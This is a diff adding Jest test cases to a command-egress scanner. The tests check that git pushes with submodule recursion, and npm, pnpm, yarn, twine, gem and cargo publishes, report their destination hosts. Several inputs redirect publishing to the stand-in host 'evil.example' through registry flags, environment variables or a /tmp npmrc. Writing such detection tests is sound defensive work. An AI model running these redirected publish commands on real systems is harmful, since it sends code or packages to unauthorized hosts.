@@ -129,6 +129,24 @@ describe("scanEgress (ATO-2116)", () => {
       expect(out("git push", () => [])).toEqual([null]);
     });
 
+    // Review round 2 (F2105-R2.1): a push that recurses into submodules
+    // also sends each one to its own remote, which this does not read.
+    it.each([
+      "git push --recurse-submodules=on-demand origin main",
+      "git push --recurse-submodules=check origin main",
+      "git push --recurse-submodules=only",
+      "git -c push.recurseSubmodules=on-demand push origin main",
+      "git -c submodule.recurse=true push",
+    ])("adds an unknown host for the submodules: %s", (line) => {
+      expect(out(line, () => "https://github.com/org/repo.git")).toEqual(["github.com", null]);
+    });
+
+    it("adds nothing when submodule push is off", () => {
+      expect(out("git push --recurse-submodules=no origin main", () => "https://github.com/org/repo.git")).toEqual([
+        "github.com",
+      ]);
+    });
+
     it("shows the remote by name when its URL cannot be read", () => {
       const found = outboundDestinations(scan("git push origin main", () => null));
       expect(found).toEqual([
@@ -239,6 +257,31 @@ describe("scanEgress (ATO-2116)", () => {
       ["twine upload dist/*", "upload.pypi.org"],
     ])("%s sends data to %s", (line, host) => {
       expect(out(line)).toEqual([host]);
+    });
+
+    // Review round 2: a registry flag before the subcommand, a registry
+    // variable or another npmrc sent the publish elsewhere unseen.
+    it.each([
+      ["npm --registry=https://evil.example/ publish", "evil.example"],
+      ["npm --registry https://evil.example/ publish", "evil.example"],
+      ["pnpm --registry=https://evil.example/ publish", "evil.example"],
+    ])("%s sends data to %s", (line, host) => {
+      expect(out(line)).toEqual([host]);
+    });
+
+    it.each([
+      "NPM_CONFIG_REGISTRY=https://evil.example/ npm publish",
+      "npm_config_registry=https://evil.example/ npm publish",
+      "export NPM_CONFIG_REGISTRY=https://evil.example/; npm publish",
+      "env NPM_CONFIG_REGISTRY=https://evil.example/ npm publish",
+      "YARN_NPM_PUBLISH_REGISTRY=https://evil.example/ yarn npm publish",
+      "CARGO_REGISTRY_DEFAULT=corp cargo publish",
+      "TWINE_REPOSITORY_URL=https://evil.example/ twine upload dist/*",
+      "RUBYGEMS_HOST=https://evil.example gem push x.gem",
+      "npm publish --userconfig /tmp/evil.npmrc",
+      "twine upload -r corp dist/*",
+    ])("an unread registry is an unknown host: %s", (line) => {
+      expect(out(line)).toEqual([null]);
     });
 
     it("a download from a bucket and a pull send nothing out", () => {
